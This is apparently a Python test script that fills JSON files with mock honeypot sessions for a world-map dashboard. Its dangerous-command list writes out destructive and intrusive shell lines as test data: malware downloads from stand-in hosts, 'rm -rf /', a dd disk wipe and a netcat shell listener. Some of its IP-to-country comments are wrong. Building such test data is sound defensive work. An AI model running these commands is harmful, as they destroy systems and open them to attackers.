# generate_mock_data.py - Tạo mock data để test world map

import json
import random
from datetime import datetime, timedelta

# Mock IPs with realistic geolocation data
MOCK_IPS = [
    '8.8.8.8',           # Google DNS - US
    '185.228.168.9',     # Russia
    '114.114.114.114',   # China
    '203.0.113.1',       # Japan  
    '80.80.80.80',       # Germany
    '9.9.9.9',           # UK
    '208.67.220.220',    # Canada
    '77.88.8.8',         # France
    '1.1.1.1',           # Australia
    '208.67.222.222'     # US West Coast
]

# Mock usernames và passwords
USERNAMES = ['root', 'admin', 'user', 'test', 'oracle', 'postgres', 'mysql', 'ubuntu', 'centos', 'guest']
PASSWORDS = ['123456', 'password', 'admin', 'root', '12345', 'qwerty', 'test', '123', 'password123', '']

# Mock commands
NORMAL_COMMANDS = ['ls', 'pwd', 'whoami', 'id', 'ps', 'top', 'df', 'free', 'uptime', 'cat /etc/passwd', 'uname -a']
DANGEROUS_COMMANDS = [
    'wget http://malware.com/bot.sh',
    'curl -O http://evil.com/miner',
    'rm -rf /',
    'dd if=/dev/zero of=/dev/sda',
    'chmod 777 /etc/passwd',
    'nc -l -p 4444 -e /bin/bash',
    'python -c "import os; os.system(\'rm -rf /\')"',
    'kill -9 -1'
]

def generate_mock_analysis_file(date_str, num_sessions=None):
    """Generate a realistic analysis JSON file for testing"""
    
    if num_sessions is None:
        num_sessions = random.randint(5, 20)
    
    # Select random IPs for this day
    selected_ips = random.sample(MOCK_IPS, min(len(MOCK_IPS), random.randint(3, 8)))
    
    analysis_data = {
        "metadata": {
            "report_date": f"{date_str}T02:57:20.436835",
            "analysis_period": {
                "start": f"{date_str[:4]}-{date_str[4:6]}-{date_str[6:8]}T00:00:00+00:00",
                "end": f"{date_str[:4]}-{date_str[4:6]}-{date_str[6:8]}T23:59:59+00:00"
            }
        },
        "statistics": {
            "total_sessions": num_sessions,
            "unique_ips": len(selected_ips)
        },
        "top_ips": [],
        "dangerous_commands": [],
        "session_details": {}
    }
    
    # Generate top_ips data
    ip_counts = {}
    for ip in selected_ips:
        count = random.randint(1, max(1, num_sessions // 2))
        ip_counts[ip] = count
        analysis_data["top_ips"].append({
            "ip": ip,
            "count": count
        })
    
    # Sort by count descending
    analysis_data["top_ips"].sort(key=lambda x: x["count"], reverse=True)
    
    # Generate dangerous commands
    if random.random() > 0.3:  # 70% chance of having dangerous commands
        dangerous_cmds = random.sample(DANGEROUS_COMMANDS, random.randint(1, 4))
        for cmd in dangerous_cmds:
            analysis_data["dangerous_commands"].append({
                "command": cmd,
                "count": random.randint(1, 5)
            })
    
    # Generate session details
    session_count = 0
    for ip in selected_ips:
        ip_session_count = ip_counts[ip]
        for _ in range(ip_session_count):
            session_id = f"mock{session_count:08x}"
            
            # Generate random timestamp for this day
            base_date = datetime.strptime(date_str, '%Y%m%d')
            random_hour = random.randint(0, 23)
            random_minute = random.randint(0, 59)
            random_second = random.randint(0, 59)
            session_time = base_date.replace(hour=random_hour, minute=random_minute, second=random_second)
            
            # Generate commands for this session
            num_commands = random.randint(1, 10)
            commands = random.choices(NORMAL_COMMANDS, k=num_commands)
            
            # Sometimes add dangerous commands
            dangerous_session_commands = []
            if random.random() > 0.7:  # 30% chance
                dangerous_session_commands = random.choices(DANGEROUS_COMMANDS, k=random.randint(1, 2))
                commands.extend(dangerous_session_commands)
            
            # Generate downloads (rarely)
            downloads = []
            if random.random() > 0.9:  # 10% chance
                downloads = [{
                    "url": f"http://malicious-site{random.randint(1,5)}.com/malware.sh",
                    "filename": f"malware{random.randint(1,100)}.sh"
                }]
            
            analysis_data["session_details"][session_id] = {
                "ip": ip,
                "timestamp": session_time.strftime('%Y-%m-%dT%H:%M:%S.%fZ'),
                "login": {
                    "username": random.choice(USERNAMES),
                    "password": random.choice(PASSWORDS),
                    "status": random.choice(["success", "failed", "success", "success"])  # Bias toward success
                },
                "commands": commands,
                "dangerous_commands": dangerous_session_commands,
                "downloads": downloads
            }
            
            session_count += 1
    
    return analysis_data

def generate_date_range_files(start_date, end_date):
    """Generate mock files for a date range"""
    
    start_dt = datetime.strptime(start_date, '%Y%m%d')
    end_dt = datetime.strptime(end_date, '%Y%m%d')
    
    # Create data directory if it doesn't exist
    import os
    os.makedirs('data', exist_ok=True)
    
    current_dt = start_dt
    while current_dt <= end_dt:
        date_str = current_dt.strftime('%Y%m%d')
        
        # Vary the number of sessions per day
        if current_dt.weekday() < 5:  # Weekday
            base_sessions = random.randint(8, 25)
        else:  # Weekend
            base_sessions = random.randint(3, 12)
        
        # Add some randomness
        num_sessions = max(1, base_sessions + random.randint(-5, 10))
        
        mock_data = generate_mock_analysis_file(date_str, num_sessions)
        
        filename = f'data/analysis_{date_str}.json'
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(mock_data, f, indent=2, ensure_ascii=False)
        
        print(f"Generated {filename} with {num_sessions} sessions")
        current_dt += timedelta(days=1)

if __name__ == "__main__":
    # Generate mock data for the last 7 days
    end_date = datetime.now()
    start_date = end_date - timedelta(days=6)
    
    start_str = start_date.strftime('%Y%m%d')
    end_str = end_date.strftime('%Y%m%d')
    
    print(f"Generating mock data from {start_str} to {end_str}")
    generate_date_range_files(start_str, end_str)
    print("Mock data generation completed!")
    print("\nGenerated files:")
    import os
    for file in sorted(os.listdir('data')):
        if file.startswith('analysis_') and file.endswith('.json'):
            print(f"  - {file}")